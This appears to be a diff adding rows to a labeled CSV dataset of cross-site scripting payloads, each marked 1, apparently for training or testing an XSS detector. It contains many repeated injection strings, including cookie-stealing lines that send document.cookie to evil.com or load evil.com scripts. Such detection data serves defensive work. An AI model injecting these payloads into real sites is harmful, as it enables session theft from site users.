+<script>alert(1)</script>,1
+<video onloadstart=alert(1) src=x>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<details ontoggle=alert(1) open>,1
+<details ontoggle=alert(1) open>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(document.cookie)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<input onfocus=alert(1) autofocus>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<video onloadstart=alert(1) src=x>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<details ontoggle=alert(1) open>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<iframe src='javascript:alert(1)'>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<details ontoggle=alert(1) open>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<iframe src='javascript:alert(1)'>,1
+<script src='http://evil.com/xss.js'></script>,1
+<iframe src='javascript:alert(1)'>,1
+<svg/onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<body onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(document.cookie)</script>,1
+<script>alert(document.cookie)</script>,1
+<script>alert(document.cookie)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(document.cookie)</script>,1
+<input onfocus=alert(1) autofocus>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(document.cookie)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(1)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<a href='javascript:alert(1)'>click</a>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<input onfocus=alert(1) autofocus>,1
+<body onload=alert(1)>,1
+<body onload=alert(1)>,1
+<body onload=alert(1)>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<body onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(document.cookie)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(1)</script>,1
+<script>alert(document.cookie)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<body onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<input onfocus=alert(1) autofocus>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<video onloadstart=alert(1) src=x>,1
+<iframe src='javascript:alert(1)'>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(document.cookie)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<iframe src='javascript:alert(1)'>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<a href='javascript:alert(1)'>click</a>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=alert(document.cookie)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(1)</script>,1
+<script>alert(document.cookie)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=alert(1)>,1
+<svg/onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(document.cookie)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg/onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<details ontoggle=alert(1) open>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg/onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<video onloadstart=alert(1) src=x>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(document.cookie)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script src='http://evil.com/xss.js'></script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(document.cookie)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(document.cookie)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(document.cookie)>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<details ontoggle=alert(1) open>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<iframe src='javascript:alert(1)'>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(document.cookie)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(1)</script>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=alert(document.cookie)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<iframe src='javascript:alert(1)'>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg/onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<input onfocus=alert(1) autofocus>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<body onload=alert(1)>,1
+<script>alert(1)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<video onloadstart=alert(1) src=x>,1
+<details ontoggle=alert(1) open>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg/onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(document.cookie)</script>,1
+<body onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<body onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+<body onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<details ontoggle=alert(1) open>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<details ontoggle=alert(1) open>,1
+<details ontoggle=alert(1) open>,1
+<svg/onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<input onfocus=alert(1) autofocus>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script src='http://evil.com/xss.js'></script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<iframe src='javascript:alert(1)'>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<input onfocus=alert(1) autofocus>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(document.cookie)</script>,1
+<svg/onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(1)>,1
+<body onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<select onchange=alert(1)><option>x</option></select>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<body onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg/onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script src='http://evil.com/xss.js'></script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<body onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(document.cookie)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<body onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(1)</script>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(1)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<a href='javascript:alert(1)'>click</a>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(document.cookie)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<a href='javascript:alert(1)'>click</a>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(1)</script>,1
+<svg/onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<body onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+<body onload=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg/onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(1)</script>,1
+<details ontoggle=alert(1) open>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<iframe src='javascript:alert(1)'>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<body onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(1)</script>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(document.cookie)</script>,1
+<video onloadstart=alert(1) src=x>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<input onfocus=alert(1) autofocus>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<body onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script src='http://evil.com/xss.js'></script>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<body onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<input onfocus=alert(1) autofocus>,1
+<details ontoggle=alert(1) open>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(1)>,1
